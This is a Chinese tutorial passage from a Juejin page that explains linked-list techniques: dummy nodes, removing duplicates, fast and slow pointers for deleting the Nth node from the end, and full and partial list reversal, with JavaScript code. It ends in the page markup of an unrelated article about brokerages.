<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e7079d7513b3e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1084&amp;h=386&amp;s=24546&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>如果继续沿用刚才的思路，我们会发现完全走不通。因为我们的 cur 指针就是从图中第一个结点出发开始遍历的，无法定位到第一个结点的前驱结点，删除便无法完成。</p>
<p>其实在链表题中，经常会遇到这样的问题：链表的第一个结点，因为没有前驱结点，导致我们面对它无从下手。这时我们就可以用一个 <code>dummy</code> 结点来解决这个问题。<br/>
所谓 dummy 结点，就是咱们人为制造出来的第一个结点的前驱结点，这样链表中所有的结点都能确保有一个前驱结点，也就都能够用同样的逻辑来处理了。<br/>
dummy 结点能够帮助我们降低链表处理过程的复杂度，处理链表时，不设 dummy 结点思路可能会打不开；设了 dummy 结点的话，就算不一定用得上，也不会出错。所以笔者个人非常喜欢用 dummy 结点。有心的同学可能也会注意到，在本节的第一题“链表的合并”中，其实也有 dummy 结点的身影。</p>
<p>回到这道题上来，我们首先要做的就是定义一个 dummy 结点，指向链表的起始位置：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e7109a0a2ad77~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1202&amp;h=304&amp;s=20917&amp;e=png" alt="" loading="lazy"/>
这样一来，如果想要删除两个连续重复的值为 1 的结点，我们只需要把 dummy 结点的 next
指针直接指向 2：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/17/170e7116f49a1dc4~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1284&amp;h=384&amp;s=31643&amp;e=png" alt="" loading="lazy"/></p>
<p>如此一来，就大功告成啦~</p>
<p>注意：由于重复的结点可能不止一个两个，我们这里需要用一个 while 循环来反复地进行重复结点的判断和删除操作。</p>
<h3 data-id="heading-112">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> deleteDuplicates = <span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) {
    <span class="hljs-comment">// 极端情况：0个或1个结点，则不会重复，直接返回</span>
    <span class="hljs-keyword">if</span>(!head || !head.<span class="hljs-property">next</span>) {
        <span class="hljs-keyword">return</span> head
    }
    <span class="hljs-comment">// dummy 登场</span>
    <span class="hljs-keyword">let</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>() 
    <span class="hljs-comment">// dummy 永远指向头结点</span>
    dummy.<span class="hljs-property">next</span> = head   
    <span class="hljs-comment">// cur 从 dummy 开始遍历</span>
    <span class="hljs-keyword">let</span> cur = dummy 
    <span class="hljs-comment">// 当 cur 的后面有至少两个结点时</span>
    <span class="hljs-keyword">while</span>(cur.<span class="hljs-property">next</span> &amp;&amp; cur.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>) {
        <span class="hljs-comment">// 对 cur 后面的两个结点进行比较</span>
        <span class="hljs-keyword">if</span>(cur.<span class="hljs-property">next</span>.<span class="hljs-property">val</span> === cur.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>.<span class="hljs-property">val</span>) {
            <span class="hljs-comment">// 若值重复，则记下这个值</span>
            <span class="hljs-keyword">let</span> val = cur.<span class="hljs-property">next</span>.<span class="hljs-property">val</span>
            <span class="hljs-comment">// 反复地排查后面的元素是否存在多次重复该值的情况</span>
            <span class="hljs-keyword">while</span>(cur.<span class="hljs-property">next</span> &amp;&amp; cur.<span class="hljs-property">next</span>.<span class="hljs-property">val</span>===val) {
                <span class="hljs-comment">// 若有，则删除</span>
                cur.<span class="hljs-property">next</span> = cur.<span class="hljs-property">next</span>.<span class="hljs-property">next</span> 
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 若不重复，则正常遍历</span>
            cur = cur.<span class="hljs-property">next</span>
        }
    }
    <span class="hljs-comment">// 返回链表的起始结点</span>
    <span class="hljs-keyword">return</span> dummy.<span class="hljs-property">next</span>;
};
</code></pre>
<h2 data-id="heading-113">小结</h2>
<p>在本节，我们对链表真题大军中的“小可爱”流派进行了剖析。通过对“小可爱”流派的学习，能够帮助大家巩固对链表数据结构特性的认知，同时强化基本的硬编码能力。<br/>
从下节开始，我们将用两个专题的时间，分解链表中的“不可爱”流派。接下来的学习或许不像本节一样轻松，但相信一定能给大家带来更重磅的收获~~</p>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）</p>
<h2 data-id="heading-114">快慢指针与多指针</h2>
<p>链表题目中，有一类会涉及到<strong>反复的遍历</strong>。涉及反复遍历的题目，题目本身虽然不会直接跟你说“你好，我是一道需要反复遍历的题目”，但只要你尝试用常规的思路分析它，你会发现它一定涉及反复遍历；同时，涉及反复遍历的题目，还有一个更明显的特征，就是它们往往会涉及<strong>相对复杂的链表操作</strong>，比如反转、指定位置的删除等等。</p>
<p>解决这类问题，我们用到的是双指针中的“快慢指针”。快慢指针指的是两个一前一后的指针，两个指针往同一个方向走，只是一个快一个慢。快慢指针严格来说只能有俩，不过实际做题中，可能会出现一前、一中、一后的三个指针，这种超过两个指针的解题方法也叫“多指针法”。</p>
<p>快慢指针+多指针，双管齐下，可以帮助我们解决链表中的大部分复杂操作问题。</p>
<h2 data-id="heading-115">快慢指针——删除链表的倒数第 N 个结点</h2>
<blockquote>
<p>真题描述：给定一个链表，删除链表的倒数第 n 个结点，并且返回链表的头结点。</p>
</blockquote>
<blockquote>
<p>示例：
给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 n = 2.<br/>
当删除了倒数第二个结点后，链表变为 1-&gt;2-&gt;3-&gt;5.<br/>
说明：
给定的 n 保证是有效的。</p>
</blockquote>
<h3 data-id="heading-116">思路分析</h3>
<h4 data-id="heading-117">小贴士：dummy 结点的使用</h4>
<p>上一节我给大家介绍了 <code>dummy</code> 结点：它可以帮我们处理掉头结点为空的边界问题，帮助我们简化解题过程。因此涉及链表操作、尤其是涉及结点删除的题目（对前驱结点的存在性要求比较高），我都建议大家写代码的时候直接把 <code>dummy</code> 给用起来，建立好的编程习惯：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>()
<span class="hljs-comment">// 这里的 head 是链表原有的第一个结点</span>
dummy.<span class="hljs-property">next</span> = head
</code></pre>
<h4 data-id="heading-118">“倒数”变“正数”</h4>
<p>链表的删除我们上节已经讲过，相信都难不倒大家。这道题的难点实际在于这个“倒数第 N 个”如何定位。</p>
<p>考虑到咱们的遍历不可能从后往前走，因此这个“倒数第 N 个” 咱们完全可以转换为“正数第 <code>len - n + 1</code>"个。这里这个 <code>len</code> 代表链表的总长度，比如说咱们链表长为 7，那么倒数第 1 个就是正数第 7 个。按照这个思路往下分析，如果走直接遍历这条路，那么这个 <code>len</code> 就非常关键了。</p>
<p>我们可以直接遍历两趟：第一趟，设置一个变量 <code>count = 0</code>，每遍历到一个不为空的结点，<code>count</code> 就加 1，一直遍历到链表结束为止，得出链表的总长度 <code>len</code>；根据这个总长度，咱们就可以算出倒数第 <code>n</code> 个到底是正数第几个了（<code>M = len - n + 1</code>），那么我们遍历到第<code> M - 1</code>（也就是 <code>len - n</code>） 个结点的时候就可以停下来，执行删除操作（想一想，为什么是第 <code>M-1</code> 个，而不是第 <code>M</code> 个？如果你认真读了我们前面的章节，心中一定会有一个清晰的答案^_^）</p>
<p>不过这种超过一次的遍历必然需要引起我们的注意，我们应该主动去思考，“如果一次遍历来解决这个问题，我可以怎么做？”，这时候，就要请双指针法来帮忙了。</p>
<h4 data-id="heading-119">快慢指针登场</h4>
<p>按照我们已经预告过的思路，首先两个指针 <code>slow</code> 和 <code>fast</code>，全部指向链表的起始位——<code>dummy</code> 结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17125fa8d6f683e0~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1278&amp;h=436&amp;s=33032&amp;e=png" alt="" loading="lazy"/></p>
<p>快指针先出发！闷头走上 <code>n</code> 步，在第 <code>n</code> 个结点处打住，这里 <code>n=2</code>：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17125fb3593dc39d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1208&amp;h=436&amp;s=32178&amp;e=png" alt="" loading="lazy"/>
然后，快慢指针一起前进，当快指针前进到最后一个结点处时，两个指针再一起停下来：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17125fbcda4d42eb~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1262&amp;h=480&amp;s=34196&amp;e=png" alt="" loading="lazy"/></p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17125fc2466dd8b0~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1266&amp;h=462&amp;s=33756&amp;e=png" alt="" loading="lazy"/></p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17125fcbaff12b8a~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1244&amp;h=404&amp;s=31858&amp;e=png" alt="" loading="lazy"/>
此时，慢指针所指的位置，就是倒数第 <code>n</code> 个结点的前一个结点：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/14/17177b91579ddc7a~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1294&amp;h=422&amp;s=40943&amp;e=png" alt="" loading="lazy"/>
我们基于这个结点来做删除，可以说是手到擒来：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/14/17177b88bdf6fe0e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1282&amp;h=500&amp;s=48510&amp;e=png" alt="" loading="lazy"/></p>
<p>到这里，我们总结一下：<br/>
链表删除问题中，若走两次遍历，我们做了两件事：<br/>
1.求长度<br/>
2.做减法，找定位。</p>
<p>若用快慢指针，我们其实是把做减法和找定位这个过程给融合了。通过快指针先行一步、接着快慢指针一起前进这个操作，巧妙地把两个指针之间的差值保持在了“<code>n</code>”上（<strong>用空间换时间，本质上其实就是对关键信息进行提前记忆，这里咱们相当于用两个指针对差值实现了记忆</strong>），这样当快指针走到链表末尾（第 <code>len</code> 个）时，慢指针刚好就在 <code>len - n</code> 这个地方稳稳落地。</p>
<h3 data-id="heading-120">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">n</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> removeNthFromEnd = <span class="hljs-keyword">function</span>(<span class="hljs-params">head, n</span>) {
    <span class="hljs-comment">// 初始化 dummy 结点</span>
    <span class="hljs-keyword">const</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>()
    <span class="hljs-comment">// dummy指向头结点</span>
    dummy.<span class="hljs-property">next</span> = head
    <span class="hljs-comment">// 初始化快慢指针，均指向dummy</span>
    <span class="hljs-keyword">let</span> fast = dummy
    <span class="hljs-keyword">let</span> slow = dummy

    <span class="hljs-comment">// 快指针闷头走 n 步</span>
    <span class="hljs-keyword">while</span>(n!==<span class="hljs-number">0</span>){
        fast = fast.<span class="hljs-property">next</span>
        n--
    }
    
    <span class="hljs-comment">// 快慢指针一起走</span>
    <span class="hljs-keyword">while</span>(fast.<span class="hljs-property">next</span>){
        fast = fast.<span class="hljs-property">next</span>
        slow = slow.<span class="hljs-property">next</span>
    }
    
    <span class="hljs-comment">// 慢指针删除自己的后继结点</span>
    slow.<span class="hljs-property">next</span> = slow.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>
    <span class="hljs-comment">// 返回头结点</span>
    <span class="hljs-keyword">return</span> dummy.<span class="hljs-property">next</span>
};

</code></pre>
<h2 data-id="heading-121">多指针法——链表的反转</h2>
<h3 data-id="heading-122">完全反转一个链表</h3>
<blockquote>
<p>真题描述：定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。</p>
</blockquote>
<blockquote>
<p>示例:<br/>
输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br/>
输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</p>
</blockquote>
<h3 data-id="heading-123">思路解读</h3>
<p>这道题虽然是一道新题，但你要说你完全没思路，我真的哭了orz。老哥，我真想把这句话刻你显示器上——<strong>处理链表的本质，是处理链表结点之间的指针关系</strong>。<br/>
我啥也不说，就给你一张链表的结构图：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171260bdb3250b83~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1182&amp;h=294&amp;s=21722&amp;e=png" alt="" loading="lazy"/></p>
<p>来，你告诉我，我如何把这货颠倒个顺序呢？<br/>
是不是想办法把每个结点 next 指针的指向给反过来就行了：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171260d3c16a73ec~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1150&amp;h=368&amp;s=27586&amp;e=png" alt="" loading="lazy"/></p>
<p>你只要能想到这一步，就说明你对链表操作类题目已经有了最关键的感知，给你双击666~</p>
<p>接下来我们需要琢磨的是如何去反转指针的指向，这里我们需要用到三个指针，它们分别指向目标结点（cur）、目标结点的前驱结点（pre）、目标结点的后继结点（next）。这里咱们随便找个结点来开刀：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712613307139215~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1254&amp;h=472&amp;s=31216&amp;e=png" alt="" loading="lazy"/></p>
<p>这里我只需要一个简单的<code>cur.next = pre</code>，就做到了 next 指针的反转：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17126177a6f049a5~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1276&amp;h=466&amp;s=36856&amp;e=png" alt="" loading="lazy"/><br/>
有同学会说：那 <code>next</code> 不是完全没用到吗？<br/>
当然有用，你瞅瞅，咱们反转完链表变成啥样了：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/17126184d0d41e31~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1142&amp;h=524&amp;s=34704&amp;e=png" alt="" loading="lazy"/></p>
<p>这会儿我要是不用 next 给你指着 cur 原本的后继结点，你上哪去定位下一个结点呢？遍历都没法继续了嗷。</p>
<p>咱们从第一个结点开始，每个结点都给它进行一次 next 指针的反转。到最后一个结点时，整个链表就已经被我们彻底反转掉了。</p>
<h3 data-id="heading-124">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-keyword">const</span> reverseList = <span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) {
    <span class="hljs-comment">// 初始化前驱结点为 null</span>
    <span class="hljs-keyword">let</span> pre = <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 初始化目标结点为头结点</span>
    <span class="hljs-keyword">let</span> cur = head;
    <span class="hljs-comment">// 只要目标结点不为 null，遍历就得继续</span>
    <span class="hljs-keyword">while</span> (cur !== <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// 记录一下 next 结点</span>
        <span class="hljs-keyword">let</span> next = cur.<span class="hljs-property">next</span>;
        <span class="hljs-comment">// 反转指针</span>
        cur.<span class="hljs-property">next</span> = pre;
        <span class="hljs-comment">// pre 往前走一步</span>
        pre = cur;
        <span class="hljs-comment">// cur往前走一步</span>
        cur = next;
    }
    <span class="hljs-comment">// 反转结束后，pre 就会变成新链表的头结点</span>
    <span class="hljs-keyword">return</span> pre
};
</code></pre>
<h3 data-id="heading-125">局部反转一个链表</h3>
<p>反转链表真是座金矿，反转完整体反转局部，反转完局部还能每 k 个一组花式反转（最后这个略难，我们会放在真题训练环节来做）。虽然难度依次进阶，但只要把握住核心思想就没问题，下面咱们来看看如何反转局部：</p>
<blockquote>
<p>真题描述：反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。</p>
</blockquote>
<blockquote>
<p>说明:
1 ≤ m ≤ n ≤ 链表长度。</p>
</blockquote>
<blockquote>
<p>示例:<br/>
输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4<br/>
输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</p>
</blockquote>
<h3 data-id="heading-126">思路解读</h3>
<p>我们仍然是从指针反转来入手：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171260bdb3250b83~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1182&amp;h=294&amp;s=21722&amp;e=png" alt="" loading="lazy"/></p>
<p>按照题中的示例，假如我们需要反转的是链表的第 2-4 之间的结点，那么对应的指针逆序后会是这个样子：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171262f560bc0f5e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1160&amp;h=348&amp;s=27174&amp;e=png" alt="" loading="lazy"/></p>
<p>4指3，3指2，这都没问题，关键在于，如何让1指向4、让2指向5呢？这就要求我们在单纯的重复“逆序”这个动作之外，还需要对被逆序的区间前后的两个结点做额外的处理：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/1712631ee4da721e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1242&amp;h=368&amp;s=26040&amp;e=png" alt="" loading="lazy"/></p>
<p>由于我们遍历链表的顺序是从前往后遍历，那么为了避免结点1和结点2随着遍历向后推进被遗失，我们需要提前把1结点缓存下来。而结点5就没有这么麻烦了：随着遍历的进行，当我们完成了结点4的指针反转后，此时
cur 指针就恰好指在结点5上：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/3/29/171263684ef03dd0~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1196&amp;h=520&amp;s=38102&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>此时我们直接将结点2的 next 指针指向 cur、将结点1的 next 指针指向 pre 即可。</p>
<h3 data-id="heading-127">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ListNode</span>} <span class="hljs-variable">head</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">m</span>
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">n</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">ListNode</span>}
 */</span>
<span class="hljs-comment">// 入参是头结点、m、n</span>
<span class="hljs-keyword">const</span> reverseBetween = <span class="hljs-keyword">function</span>(<span class="hljs-params">head, m, n</span>) {
    <span class="hljs-comment">// 定义pre、cur，用leftHead来承接整个区间的前驱结点</span>
    <span class="hljs-keyword">let</span> pre,cur,leftHead
    <span class="hljs-comment">// 别忘了用 dummy 嗷</span>
    <span class="hljs-keyword">const</span> dummy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>()  
    <span class="hljs-comment">// dummy后继结点是头结点</span>
    dummy.<span class="hljs-property">next</span> = head
    <span class="hljs-comment">// p是一个游标，用于遍历，最初指向 dummy</span>
    <span class="hljs-keyword">let</span> p = dummy  
    <span class="hljs-comment">// p往前走 m-1 步，走到整个区间的前驱结点处</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;m-<span class="hljs-number">1</span>;i++){
        p = p.<span class="hljs-property">next</span>
    }
    <span class="hljs-comment">// 缓存这个前驱结点到 leftHead 里</span>
    leftHead = p
    <span class="hljs-comment">// start 是反转区间的第一个结点</span>
    <span class="hljs-keyword">let</span> start = leftHead.<span class="hljs-property">next</span>  
    <span class="hljs-comment">// pre 指向start</span>
    pre = start
    <span class="hljs-comment">// cur 指向 start 的下一个结点</span>
    cur = pre.<span class="hljs-property">next</span>
    <span class="hljs-comment">// 开始重复反转动作</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=m;i&lt;n;i++){
        <span class="hljs-keyword">let</span> next = cur.<span class="hljs-property">next</span>
        cur.<span class="hljs-property">next</span> = pre
        pre = cur
        cur = next
    }
    <span class="hljs-comment">//  leftHead 的后继结点此时为反转后的区间的第一个结点</span>
    leftHead.<span class="hljs-property">next</span> = pre
    <span class="hljs-comment">// 将区间内反转后的最后一个结点 next 指向 cur</span>
    start.<span class="hljs-property">next</span>=cur
    <span class="hljs-comment">// dummy.next 永远指向链表头结点</span>
    <span class="hljs-keyword">return</span> dummy.<span class="hljs-property">next</span>
};
</code></pre>
<p>小贴士：楼上的两道反转题目，都可以用递归来实现，你试试？</p>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[当券商成立互联网分公司，面向长尾客户的“智能化总攻”开始了]]></title>    <link>https://juejin.cn/post/7584043969687781428</link>    <guid>https://juejin.cn/post/7584043969687781428</guid>    <pubDate>2025-12-16T08:51:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584043969687781428" data-draft-id="7584071941025071119" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="当券商成立互联网分公司，面向长尾客户的“智能化总攻”开始了"/> <meta itemprop="keywords" content="APP"/> <meta itemprop="datePublished" content="2025-12-16T08:51:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FinClip"/> <meta itemprop="url" content="https://juejin.cn/user/395479918322696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            当券商成立互联网分公司，面向长尾客户的“智能化总攻”开始了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/395479918322696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FinClip
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:51:57.000Z" title="Tue Dec 16 2025 08:51:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 